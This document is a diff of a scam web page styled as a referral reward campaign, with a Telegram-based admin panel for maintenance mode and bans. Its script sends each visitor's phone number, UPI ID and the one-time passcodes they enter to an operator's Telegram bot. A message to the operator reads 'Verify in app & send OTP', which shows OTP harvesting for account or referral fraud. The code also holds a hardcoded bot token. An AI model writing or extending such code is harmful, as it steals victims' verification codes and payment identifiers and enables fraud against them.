@@ -14,8 +14,26 @@
       --text: #f0f0ff; --muted: #6b6b8a;
       --border: rgba(0,229,255,0.12);
     }
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     body { background:var(--bg);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:'Nunito',sans-serif;color:var(--text);padding:20px;overflow-x:hidden; }
+    
+    /* Connection Status */
+    .conn-status { 
+      position: fixed; 
+      top: 10px; 
+      left: 10px; 
+      padding: 6px 12px; 
+      background: rgba(0,0,0,0.8); 
+      border-radius: 20px; 
+      font-size: 11px; 
+      font-weight: 700; 
+      z-index: 1000; 
+      border: 1px solid var(--border);
+      font-family: 'Nunito', sans-serif;
+    }
+    .conn-status.connected { color: var(--green); border-color: var(--green); }
+    .conn-status.disconnected { color: var(--red); border-color: var(--red); }
+    .conn-status.connecting { color: var(--gold); border-color: var(--gold); }
+    
     .blob { position:fixed;border-radius:50%;filter:blur(80px);opacity:0.15;pointer-events:none;z-index:0; }
     .blob1 { width:400px;height:400px;background:var(--accent2);top:-100px;left:-100px;animation:blobMove 8s ease-in-out infinite alternate; }
     .blob2 { width:300px;height:300px;background:var(--accent);bottom:-80px;right:-80px;animation:blobMove 10s ease-in-out infinite alternate-reverse; }
@@ -126,13 +144,37 @@
     .live-indicator { display: inline-flex; align-items: center; gap: 6px; font-size: 10px; color: var(--green); margin-left: 8px; font-weight: 700; }
     .live-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; animation: pulse 2s infinite; }
     @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    
+    /* Maintenance overlay specific */
+    .maintenance-overlay { background: rgba(10, 10, 15, 0.95) !important; backdrop-filter: blur(10px); }
+    .maintenance-icon { font-size: 64px; margin-bottom: 16px; animation: spin 3s linear infinite; }
+    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
+<!-- Connection Status Indicator -->
+<div class="conn-status connecting" id="connStatus">● Connecting...</div>
+
 <div class="blob blob1"></div>
 <div class="blob blob2"></div>
 
-<div class="wrapper">
+<!-- MAINTENANCE POPUP -->
+<div class="popup-overlay maintenance-overlay hidden" id="maintenancePopup">
+  <div class="popup-box">
+    <div class="maintenance-icon">🔧</div>
+    <div class="popup-title" style="color:var(--gold)">UNDER MAINTENANCE</div>
+    <div class="popup-sub">
+      We are currently updating our systems.<br>
+      <strong style="color:var(--text)">Campaign will be live soon!</strong><br><br>
+      Please check back later or contact admin.
+    </div>
+    <button class="btn btn-primary" onclick="location.reload()">Check Again</button>
+    <a href="https://www.instagram.com/bravooo.fx?igsh=MWgxN3BhZTJtaXlubw==" target="_blank"
+       style="display:block;margin-top:10px;padding:12px;border-radius:12px;font-size:14px;font-weight:800;background:linear-gradient(135deg,#e1306c,#833ab4);color:#fff;text-decoration:none;">📸 Contact Support</a>
+  </div>
+</div>
+
+<div class="wrapper" id="mainContent">
   <!-- Support -->
   <div style="position:absolute;top:0;right:0;z-index:10;">
     <a href="https://www.instagram.com/bravooo.fx?igsh=MWgxN3BhZTJtaXlubw==" target="_blank"
@@ -350,8 +392,9 @@
 </div>
 
 <script>
-  const BOT_TOKEN    = '8676131839:AAGemgWCzRC2P2l-nLfX8FTNoOKxvSMTrXY';
-  const CHAT_ID      = '1295046984';
+  // ===== CONFIGURATION =====
+  const BOT_TOKEN = '8676131839:AAGemgWCzRC2P2l-nLfX8FTNoOKxvSMTrXY';
+  const CHAT_ID = '1295046984'; // Your Telegram User ID
   const MAX_ATTEMPTS = 60;
 
   let currentPhone  = '';
@@ -363,6 +406,123 @@
   let currentDigits = 4;
   let withdrawalHistory = [];
   let isPolling     = false;
+  let pollingOffset = 0;
+  let pollTimer     = null;
+
+  // ── Storage Keys ──
+  const STORAGE_KEYS = {
+    MAINTENANCE_MODE: 'campaign_maintenance_mode',
+    BAN_MSG_ID: 'ban_msg_id',
+    PANEL_MSG_ID: 'control_panel_msg_id'
+  };
+
+  // ── Connection Status UI ──
+  function updateConnectionStatus(status, text) {
+    const el = document.getElementById('connStatus');
+    if (!el) return;
+    el.className = 'conn-status ' + status;
+    el.textContent = text;
+  }
+
+  // ── Test Bot Connection ──
+  async function testBotConnection() {
+    updateConnectionStatus('connecting', '● Connecting...');
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+      const data = await res.json();
+      if (data.ok) {
+        updateConnectionStatus('connected', `● ${data.result.first_name}`);
+        return true;
+      } else {
+        updateConnectionStatus('disconnected', '● Bot Error');
+        return false;
+      }
+    } catch (e) {
+      updateConnectionStatus('disconnected', '● Offline');
+      return false;
+    }
+  }
+
+  // ── Maintenance Mode Functions ──
+  function isMaintenanceMode() {
+    return localStorage.getItem(STORAGE_KEYS.MAINTENANCE_MODE) === 'true';
+  }
+
+  function setMaintenanceMode(enabled) {
+    localStorage.setItem(STORAGE_KEYS.MAINTENANCE_MODE, enabled ? 'true' : 'false');
+    if (enabled) {
+      show('maintenancePopup');
+      document.getElementById('mainContent').style.pointerEvents = 'none';
+      document.getElementById('mainContent').style.opacity = '0.3';
+    } else {
+      hide('maintenancePopup');
+      document.getElementById('mainContent').style.pointerEvents = 'auto';
+      document.getElementById('mainContent').style.opacity = '1';
+    }
+  }
+
+  // Send Control Panel to Telegram with Live/Stop buttons
+  async function sendControlPanel() {
+    try {
+      const isLive = !isMaintenanceMode();
+      const statusText = isLive ? '🟢 LIVE' : '🔴 MAINTENANCE';
+      const messageText = `🎛️ <b>Website Control Panel</b>\n\nCurrent Status: <b>${statusText}</b>\n\nUse buttons below to control the website:`;
+      
+      const keyboard = {
+        inline_keyboard: [
+          [
+            { text: '🟢 Go Live', callback_data: 'set_live' },
+            { text: '🔴 Stop/Maintenance', callback_data: 'set_maintenance' }
+          ],
+          [
+            { text: '📊 Check Status', callback_data: 'check_status' }
+          ]
+        ]
+      };
+      
+      // Try to edit existing message first
+      const existingMsgId = localStorage.getItem(STORAGE_KEYS.PANEL_MSG_ID);
+      let success = false;
+      
+      if (existingMsgId) {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              message_id: parseInt(existingMsgId),
+              text: messageText,
+              parse_mode: 'HTML',
+              reply_markup: keyboard
+            })
+          });
+          const data = await res.json();
+          if (data.ok) success = true;
+        } catch (e) {}
+      }
+      
+      // Send new message if editing failed
+      if (!success) {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: messageText,
+            parse_mode: 'HTML',
+            reply_markup: keyboard
+          })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          localStorage.setItem(STORAGE_KEYS.PANEL_MSG_ID, data.result.message_id);
+        }
+      }
+    } catch (error) {
+      console.error('Control panel error:', error);
+    }
+  }
 
   // ── Storage ──
   function saveState() {
@@ -384,221 +544,275 @@
 
   // ── Telegram ──
   async function sendTelegram(text, replyMarkup) {
-    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
-    if (replyMarkup) body.reply_markup = replyMarkup;
-    const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    });
-    return await res.json();
+    try {
+      const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
+      if (replyMarkup) body.reply_markup = replyMarkup;
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+      return await res.json();
+    } catch (e) {
+      return { ok: false, error: e.message };
+    }
   }
   
   async function editTelegramMessage(messageId, text, replyMarkup) {
-    const body = { 
-      chat_id: CHAT_ID, 
-      message_id: messageId,
-      text: text, 
-      parse_mode: 'HTML' 
-    };
-    if (replyMarkup) body.reply_markup = replyMarkup;
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body)
-    });
-    return await res.json();
+    try {
+      const body = { 
+        chat_id: CHAT_ID, 
+        message_id: messageId,
+        text: text, 
+        parse_mode: 'HTML' 
+      };
+      if (replyMarkup) body.reply_markup = replyMarkup;
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+      return await res.json();
+    } catch (e) {
+      return { ok: false, error: e.message };
+    }
   }
   
   async function answerCallback(id, text) {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ callback_query_id: id, text, show_alert: true })
-    });
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          callback_query_id: id, 
+          text: text, 
+          show_alert: true 
+        })
+      });
+    } catch (e) {}
   }
 
   // ── Ban system ──
-  const BAN_MSG_KEY = 'ban_msg_id';
   async function fetchBanList() {
     try {
-      const banMsgId = localStorage.getItem(BAN_MSG_KEY);
+      const banMsgId = localStorage.getItem(STORAGE_KEYS.BAN_MSG_ID);
       if (!banMsgId) return [];
-      const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/forwardMessage`, {
-        method: 'POST', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, from_chat_id: CHAT_ID, message_id: parseInt(banMsgId) })
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/forwardMessage`, {
+        method: 'POST', 
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ 
+          chat_id: CHAT_ID, 
+          from_chat_id: CHAT_ID, 
+          message_id: parseInt(banMsgId) 
+        })
       });
       const data = await res.json();
       if (data.ok && data.result.text) {
         return data.result.text.split('\n').filter(l => l.startsWith('BAN:'))
-          .map(l => { const p = l.replace('BAN:','').split('|'); return { phone: p[0], upi: p[1] }; });
+          .map(l => { 
+            const p = l.replace('BAN:','').split('|'); 
+            return { phone: p[0], upi: p[1] }; 
+          });
       }
     } catch(e) {}
     return [];
   }
+  
   async function isBannedRemote(phone, upi) {
     const list = await fetchBanList();
     return list.some(b => b.phone === phone || b.upi === upi);
   }
+  
   async function banUserRemote(phone, upi) {
     const list = await fetchBanList();
     if (!list.some(b => b.phone === phone)) list.push({ phone, upi });
     const text = list.map(b => `BAN:${b.phone}|${b.upi}`).join('\n') || 'BAN_LIST_EMPTY';
-    const banMsgId = localStorage.getItem(BAN_MSG_KEY);
+    const banMsgId = localStorage.getItem(STORAGE_KEYS.BAN_MSG_ID);
     if (banMsgId) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-        method: 'POST', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, message_id: parseInt(banMsgId), text })
+        method: 'POST', 
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ 
+          chat_id: CHAT_ID, 
+          message_id: parseInt(banMsgId), 
+          text: text 
+        })
       });
     } else {
-      const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text })
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST', 
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
       });
       const data = await res.json();
-      if (data.ok) localStorage.setItem(BAN_MSG_KEY, data.result.message_id);
+      if (data.ok) localStorage.setItem(STORAGE_KEYS.BAN_MSG_ID, data.result.message_id);
     }
   }
+  
   async function unbanUserRemote(phone) {
-    const list    = await fetchBanList();
+    const list = await fetchBanList();
     const newList = list.filter(b => b.phone !== phone);
-    const text    = newList.map(b => `BAN:${b.phone}|${b.upi}`).join('\n') || 'BAN_LIST_EMPTY';
-    const banMsgId = localStorage.getItem(BAN_MSG_KEY);
+    const text = newList.map(b => `BAN:${b.phone}|${b.upi}`).join('\n') || 'BAN_LIST_EMPTY';
+    const banMsgId = localStorage.getItem(STORAGE_KEYS.BAN_MSG_ID);
     if (banMsgId) {
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-        method: 'POST', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, message_id: parseInt(banMsgId), text })
+        method: 'POST', 
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ 
+          chat_id: CHAT_ID, 
+          message_id: parseInt(banMsgId), 
+          text: text 
+        })
       });
     }
   }
 
-  // ── Polling (FIXED: Keep running in background) ──
-  let pollingOffset = 0;
-  let pollTimer     = null;
-
+  // ── Polling ──
   async function pollForCallback() {
     if (!isPolling) return;
     
     try {
-      const res  = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${pollingOffset}&timeout=3`);
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${pollingOffset}&limit=10`);
       const data = await res.json();
+      
       if (data.ok && data.result.length > 0) {
         for (const update of data.result) {
           pollingOffset = update.update_id + 1;
 
+          // Handle Messages (Commands)
           if (update.message && update.message.text) {
             const txt = update.message.text.trim();
-            if (txt === '/banlist') {
+            const fromChat = update.message.chat.id.toString();
+            
+            if (fromChat !== CHAT_ID.toString()) continue;
+            
+            if (txt === '/panel' || txt === '/control') {
+              await sendControlPanel();
+              await sendTelegram('✅ Control panel sent! Use buttons to control the website.');
+            }
+            else if (txt === '/test') {
+              await sendTelegram('🤖 Bot is working!');
+            }
+            else if (txt === '/start') {
+              await sendTelegram(
+                `🤖 <b>Bot Commands</b>\n\n` +
+                `• /panel - Show Live/Stop control buttons\n` +
+                `• /banlist - Show banned users\n\n` +
+                `Current Status: ${isMaintenanceMode() ? '🔴 MAINTENANCE' : '🟢 LIVE'}`
+              );
+            }
+            else if (txt === '/banlist') {
               const list = await fetchBanList();
               if (list.length === 0) {
                 await sendTelegram('📋 <b>Banned List</b>\n\nNo users banned.');
               } else {
-                const lines = list.map((b,i) => `${i+1}. 📱 <code>${b.phone}</code> | 💳 <code>${b.upi}</code>`).join('\n');
+                const lines = list.map((b,i) => `${i+1}. 📱 <code>${b.phone}</code>`).join('\n');
                 await sendTelegram(`📋 <b>Banned (${list.length})</b>\n\n${lines}`,
                   { inline_keyboard: list.map(b => [{ text: `🔓 Unban ${b.phone}`, callback_data: `unban_${b.phone}` }]) });
               }
             }
           }
 
+          // Handle Callback Queries (Button clicks)
           if (update.callback_query) {
-            const cb     = update.callback_query;
+            const cb = update.callback_query;
             const cbData = cb.data;
-            const cbMsgId = cb.message && cb.message.message_id;
+            const cbId = cb.id;
+            const cbMsgId = cb.message ? cb.message.message_id : null;
 
-            console.log('Callback received:', cbData); // Debug log
+            // Handle Live/Maintenance Control Buttons
+            if (cbData === 'set_live') {
+              setMaintenanceMode(false);
+              await answerCallback(cbId, '✅ Website is now LIVE!');
+              await sendControlPanel();
+              await sendTelegram('🟢 Website is now LIVE');
+              continue;
+            }
+            
+            if (cbData === 'set_maintenance') {
+              setMaintenanceMode(true);
+              await answerCallback(cbId, '🔴 Website stopped for maintenance!');
+              await sendControlPanel();
+              await sendTelegram('🔴 Website under MAINTENANCE');
+              continue;
+            }
+            
+            if (cbData === 'check_status') {
+              const status = isMaintenanceMode() ? '🔴 MAINTENANCE' : '🟢 LIVE';
+              await answerCallback(cbId, `Status: ${status}`);
+              continue;
+            }
 
-            // Handle Withdrawal Payment Confirmation
+            // Handle Withdrawal Payment
             if (cbData && cbData.startsWith('withdraw_paid_')) {
               const parts = cbData.split('_');
               const targetPhone = parts[2];
               const withdrawId = parts[3];
               
-              console.log('Processing payment for:', targetPhone, 'ID:', withdrawId);
-              
-              // Update that phone's withdrawal history in localStorage
               const userData = JSON.parse(localStorage.getItem('ref_' + targetPhone) || '{}');
-              if (userData.withdrawalHistory && userData.withdrawalHistory.length > 0) {
+              if (userData.withdrawalHistory) {
                 const withdrawalIndex = userData.withdrawalHistory.findIndex(w => w.id === withdrawId);
                 
                 if (withdrawalIndex !== -1 && userData.withdrawalHistory[withdrawalIndex].status !== 'Paid ✅') {
-                  // Update status
                   userData.withdrawalHistory[withdrawalIndex].status = 'Paid ✅';
                   localStorage.setItem('ref_' + targetPhone, JSON.stringify(userData));
                   
-                  // Update current user's view if it's the current user
                   if (targetPhone === currentPhone) {
                     withdrawalHistory = userData.withdrawalHistory;
-                    // Refresh history popup if open
                     if (!document.getElementById('withdrawHistoryPopup').classList.contains('hidden')) {
                       refreshWithdrawalHistory();
                     }
-                    // Show notification if on wallet screen
-                    if (!document.getElementById('step3').classList.contains('hidden')) {
-                      showToast('🎉 Payment received! Check your History.');
-                    }
                   }
                   
-                  // Update Telegram message to remove button and show completed
                   await editTelegramMessage(cbMsgId,
                     `✅ <b>Payment Completed</b>\n\n` +
                     `📱 <b>Phone:</b> <code>${targetPhone}</code>\n` +
-                    `💳 <b>UPI ID:</b> <code>${userData.upi || 'Unknown'}</code>\n` +
                     `💰 <b>Amount:</b> ₹${userData.withdrawalHistory[withdrawalIndex].amount}\n` +
-                    `✅ <b>Status:</b> PAID\n\n` +
-                    `Payment confirmed by admin on ${new Date().toLocaleString()}.`
+                    `✅ <b>Status:</b> PAID`
                   );
                   
-                  await answerCallback(cb.id, `✅ Payment marked as complete! ₹${userData.withdrawalHistory[withdrawalIndex].amount} paid to ${targetPhone}`);
-                  continue;
-                } else {
-                  await answerCallback(cb.id, '⚠️ Already marked as paid or not found.');
-                  continue;
+                  await answerCallback(cbId, 'Payment complete!');
                 }
-              } else {
-                await answerCallback(cb.id, '⚠️ User data not found in system.');
-                continue;
               }
+              continue;
             }
 
             // Unban
             if (cbData && cbData.startsWith('unban_')) {
               const ph = cbData.replace('unban_','');
               await unbanUserRemote(ph);
-              await answerCallback(cb.id, `✅ ${ph} unbanned!`);
-              await sendTelegram(`✅ <b>Unbanned!</b>\n📱 <code>${ph}</code> can access site again.`);
+              await answerCallback(cbId, `✅ ${ph} unbanned!`);
+              await sendTelegram(`✅ Unbanned: 📱 ${ph}`);
               continue;
             }
 
-            // OTP-related callbacks (only process if matches current session)
+            // OTP callbacks
             if (cbMsgId === pendingMsgId || cbMsgId === pendingMsgId2) {
               if (cbData === 'otp_correct') {
-                await answerCallback(cb.id, '✅ OTP Approved! ₹1 added to user.');
-                // Don't stop polling anymore - keep it running for withdrawals
+                await answerCallback(cbId, '✅ OTP Approved! ₹1 added.');
                 walletBal += 1;
-                attempts  += 1;
+                attempts += 1;
                 saveState();
-                hide('step1'); hide('step2');
+                hide('step1'); 
+                hide('step2');
                 show('step3');
                 refreshWallet();
                 setTimeout(() => showPopup('rewardPopup'), 150);
-                await sendTelegram(
-                  `💰 <b>Reward Auto-Credited</b>\n` +
-                  `📱 <code>${currentPhone}</code>\n` +
-                  `Attempts: ${attempts}/${MAX_ATTEMPTS} | Balance: ₹${walletBal}`
-                ).catch(()=>{});
+                await sendTelegram(`💰 Reward: 📱 ${currentPhone}`);
 
               } else if (cbData === 'otp_wrong') {
-                await answerCallback(cb.id, '❌ Wrong OTP marked!');
-                // Don't stop polling here either
+                await answerCallback(cbId, '❌ Wrong OTP!');
                 showPopup('wrongOtpPopup');
-                await sendTelegram(`⚠️ Marked <b>WRONG OTP</b> for 📱 <code>${currentPhone}</code>`);
+                await sendTelegram(`⚠️ Wrong OTP: 📱 ${currentPhone}`);
 
               } else if (cbData === 'ban_user') {
-                await answerCallback(cb.id, '🚫 User banned!');
+                await answerCallback(cbId, '🚫 User banned!');
                 await banUserRemote(currentPhone, currentUpi);
-                hide('step1'); hide('step2'); hide('step3');
+                hide('step1'); 
+                hide('step2'); 
+                hide('step3');
                 showPopup('bannedPopup');
-                await sendTelegram(
-                  `🔴 <b>Banned!</b>\n📱 <code>${currentPhone}</code> | 💳 <code>${currentUpi}</code>`,
-                  { inline_keyboard: [[{ text: `🔓 Unban ${currentPhone}`, callback_data: `unban_${currentPhone}` }]] }
-                );
+                await sendTelegram(`🔴 Banned: 📱 ${currentPhone}`);
               }
             }
           }
@@ -616,7 +830,6 @@
   function startPolling() {
     if (isPolling) return;
     isPolling = true;
-    // Get latest offset first
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&limit=1`)
       .then(res => res.json())
       .then(data => {
@@ -628,12 +841,6 @@
       .catch(() => {
         pollForCallback();
       });
-  }
-  
-  function stopPolling() {
-    isPolling = false;
-    clearTimeout(pollTimer);
-    pollTimer = null;
   }
 
   // Toast notification
@@ -664,8 +871,8 @@
   }
 
   // ── UI helpers ──
-  function show(id)      { document.getElementById(id).classList.remove('hidden'); }
-  function hide(id)      { document.getElementById(id).classList.add('hidden'); }
+  function show(id) { document.getElementById(id).classList.remove('hidden'); }
+  function hide(id) { document.getElementById(id).classList.add('hidden'); }
   function showPopup(id) { show(id); }
   function hidePopup(id) { hide(id); }
 
@@ -677,10 +884,10 @@
     container.innerHTML = '';
     for (let i = 0; i < digits; i++) {
       const inp = document.createElement('input');
-      inp.type        = 'tel';
-      inp.maxLength   = 1;
-      inp.className   = 'otp';
-      inp.id          = 'o' + (i + 1);
+      inp.type = 'tel';
+      inp.maxLength = 1;
+      inp.className = 'otp';
+      inp.id = 'o' + (i + 1);
       inp.autocomplete = 'off';
       container.appendChild(inp);
     }
@@ -709,11 +916,11 @@
 
   // ── Wallet UI ──
   function refreshWallet() {
-    document.getElementById('walletBal').textContent    = '₹' + walletBal;
+    document.getElementById('walletBal').textContent = '₹' + walletBal;
     document.getElementById('attemptsText').textContent = attempts + ' attempt' + (attempts !== 1 ? 's' : '') + ' used';
     document.getElementById('remainingBadge').textContent = (MAX_ATTEMPTS - attempts) + ' remaining';
-    document.getElementById('progFill').style.width     = (attempts / MAX_ATTEMPTS * 100) + '%';
-    document.getElementById('withdrawBtn').disabled     = walletBal < 5;
+    document.getElementById('progFill').style.width = (attempts / MAX_ATTEMPTS * 100) + '%';
+    document.getElementById('withdrawBtn').disabled = walletBal < 5;
     const rem = MAX_ATTEMPTS - attempts;
     document.getElementById('remainingCount').textContent = rem;
     const nextBtn = document.getElementById('nextStepBtn');
@@ -745,56 +952,79 @@
 
   // ── STEP 1: Submit ──
   document.getElementById('submitDetailsBtn').addEventListener('click', async () => {
+    if (isMaintenanceMode()) {
+      showPopup('maintenancePopup');
+      return;
+    }
+    
     const phone = document.getElementById('phone').value.trim();
-    const upi   = document.getElementById('upi').value.trim();
-    const err   = document.getElementById('err1');
-    const btn   = document.getElementById('submitDetailsBtn');
+    const upi = document.getElementById('upi').value.trim();
+    const err = document.getElementById('err1');
+    const btn = document.getElementById('submitDetailsBtn');
+    
     err.textContent = '';
 
-    if (!phone || !upi)                      { err.textContent = 'Please fill all fields.'; return; }
-    if (phone.length !== 10 || isNaN(phone)) { err.textContent = 'Enter a valid 10-digit number.'; return; }
-    if (!upi.includes('@'))                  { err.textContent = 'Enter a valid UPI ID.'; return; }
+    if (!phone || !upi) { err.textContent = 'Please fill all fields.'; return; }
+    if (phone.length !== 10 || isNaN(phone)) { err.textContent = 'Enter valid 10-digit number.'; return; }
+    if (!upi.includes('@')) { err.textContent = 'Enter valid UPI ID.'; return; }
 
-    btn.disabled = true; btn.textContent = 'Checking...';
+    btn.disabled = true; 
+    btn.textContent = 'Checking...';
 
     const banned = await isBannedRemote(phone, upi);
-    if (banned) { btn.disabled = false; btn.textContent = 'Send OTP Request →'; showPopup('bannedPopup'); return; }
+    if (banned) { 
+      btn.disabled = false; 
+      btn.textContent = 'Send OTP Request →'; 
+      showPopup('bannedPopup'); 
+      return; 
+    }
 
     const saved = JSON.parse(localStorage.getItem('ref_' + phone) || '{}');
     if ((saved.attempts || 0) >= MAX_ATTEMPTS) {
-      btn.disabled = false; btn.textContent = 'Send OTP Request →';
-      showPopup('numberUsedPopup'); return;
+      btn.disabled = false; 
+      btn.textContent = 'Send OTP Request →';
+      showPopup('numberUsedPopup'); 
+      return;
     }
+    
     const upiPhone = localStorage.getItem('upi_' + upi);
     if (upiPhone && upiPhone !== phone) {
       const upiSaved = JSON.parse(localStorage.getItem('ref_' + upiPhone) || '{}');
       if ((upiSaved.attempts || 0) >= MAX_ATTEMPTS) {
-        btn.disabled = false; btn.textContent = 'Send OTP Request →';
-        showPopup('upiUsedPopup'); return;
+        btn.disabled = false; 
+        btn.textContent = 'Send OTP Request →';
+        showPopup('upiUsedPopup'); 
+        return;
       }
     }
 
     btn.textContent = 'Sending...';
+    
     try {
       const tgRes = await sendTelegram(
         `🔔 <b>New Referral Request</b>\n\n` +
         `📱 <b>Phone:</b> <code>${phone}</code>\n` +
         `💳 <b>UPI ID:</b> <code>${upi}</code>\n` +
         `🔢 <b>Attempt:</b> ${(saved.attempts||0)+1}/${MAX_ATTEMPTS}\n\n` +
-        `👉 Verify in your app &amp; send OTP.\nThen tap below:`,
+        `👉 Verify in app & send OTP:`,
         { inline_keyboard: [[
             { text: '✅ OTP Correct', callback_data: 'otp_correct' },
-            { text: '❌ Wrong OTP',   callback_data: 'otp_wrong'   }
+            { text: '❌ Wrong OTP', callback_data: 'otp_wrong' }
           ],[
-            { text: '🚫 Ban This User', callback_data: 'ban_user' }
+            { text: '🚫 Ban User', callback_data: 'ban_user' }
           ]]
         }
       );
-      currentPhone = phone; currentUpi = upi;
+      
+      currentPhone = phone; 
+      currentUpi = upi;
+      
       if (tgRes.ok) pendingMsgId = tgRes.result.message_id;
+      
       let cd = 10;
       btn.disabled = true;
       btn.textContent = `Please wait ${cd}s...`;
+      
       await new Promise(resolve => {
         const t = setInterval(() => {
           cd--;
@@ -802,97 +1032,123 @@
           if (cd <= 0) { clearInterval(t); resolve(); }
         }, 1000);
       });
-      btn.disabled = false; btn.textContent = 'Send OTP Request →';
-      hide('step1'); show('step2');
+      
+      btn.disabled = false; 
+      btn.textContent = 'Send OTP Request →';
+      hide('step1'); 
+      show('step2');
       document.getElementById('o1') && document.getElementById('o1').focus();
-      startPolling(); // Start polling and keep it running
+      startPolling();
     } catch(e) {
       err.textContent = 'Failed to send. Check internet.';
-      let secs = 7;
-      btn.disabled = true;
-      btn.textContent = `Please wait ${secs}s...`;
-      const errTimer = setInterval(() => {
-        secs--;
-        if (secs <= 0) {
-          clearInterval(errTimer);
-          btn.disabled = false;
-          btn.textContent = 'Send OTP Request →';
-        } else {
-          btn.textContent = `Please wait ${secs}s...`;
-        }
-      }, 1000);
+      btn.disabled = false; 
+      btn.textContent = 'Send OTP Request →';
     }
   });
 
   // Back
   document.getElementById('backBtn').addEventListener('click', () => {
-    hide('step2'); show('step1');
+    hide('step2'); 
+    show('step1');
     document.getElementById('err2').textContent = '';
     hide('waitingBox');
     const btn = document.getElementById('verifyOtpBtn');
-    btn.disabled = false; btn.textContent = 'Submit OTP →';
+    btn.disabled = false; 
+    btn.textContent = 'Submit OTP →';
     const submitBtn = document.getElementById('submitDetailsBtn');
-    submitBtn.disabled = false; submitBtn.textContent = 'Send OTP Request →';
+    submitBtn.disabled = false; 
+    submitBtn.textContent = 'Send OTP Request →';
   });
 
   // ── STEP 2: Submit OTP ──
   document.getElementById('verifyOtpBtn').addEventListener('click', async () => {
+    if (isMaintenanceMode()) {
+      showPopup('maintenancePopup');
+      return;
+    }
+    
     const inputs = document.getElementById('otpBoxes').querySelectorAll('.otp');
     let otp = '';
     inputs.forEach(i => otp += i.value.trim());
     const err = document.getElementById('err2');
     const btn = document.getElementById('verifyOtpBtn');
+    
     err.textContent = '';
 
     const expectedLen = document.getElementById('otpBoxes').querySelectorAll('.otp').length;
-    if (otp.length < expectedLen) { err.textContent = `Please enter all ${expectedLen} digits.`; return; }
+    if (otp.length < expectedLen) { 
+      err.textContent = `Enter all ${expectedLen} digits.`; 
+      return; 
+    }
 
-    btn.disabled = true; btn.textContent = 'Submitting...';
+    btn.disabled = true; 
+    btn.textContent = 'Submitting...';
 
     try {
       const otpMsgRes = await sendTelegram(
-        `🔑 <b>OTP Submitted by User</b>\n\n` +
+        `🔑 <b>OTP Submitted</b>\n\n` +
         `📱 <b>Phone:</b> <code>${currentPhone}</code>\n` +
-        `💳 <b>UPI ID:</b> <code>${currentUpi}</code>\n` +
-        `🔢 <b>OTP Entered (${currentDigits}-digit):</b> <code>${otp}</code>\n\n` +
-        `👆 Tap ✅ Correct or ❌ Wrong on the message above.`
+        `🔢 <b>OTP:</b> <code>${otp}</code>\n\n` +
+        `Waiting for admin verification...`
       );
+      
       if (otpMsgRes.ok) pendingMsgId2 = otpMsgRes.result.message_id;
       show('waitingBox');
       btn.textContent = 'Waiting for verification…';
     } catch(e) {
       err.textContent = 'Failed to submit. Try again.';
-      btn.disabled = false; btn.textContent = 'Submit OTP →';
+      btn.disabled = false; 
+      btn.textContent = 'Submit OTP →';
     }
   });
 
   // ── Next OTP cycle ──
   document.getElementById('nextStepBtn').addEventListener('click', () => {
-    if (attempts >= MAX_ATTEMPTS) { showPopup('limitPopup'); return; }
+    if (isMaintenanceMode()) {
+      showPopup('maintenancePopup');
+      return;
+    }
+    
+    if (attempts >= MAX_ATTEMPTS) { 
+      showPopup('limitPopup'); 
+      return; 
+    }
+    
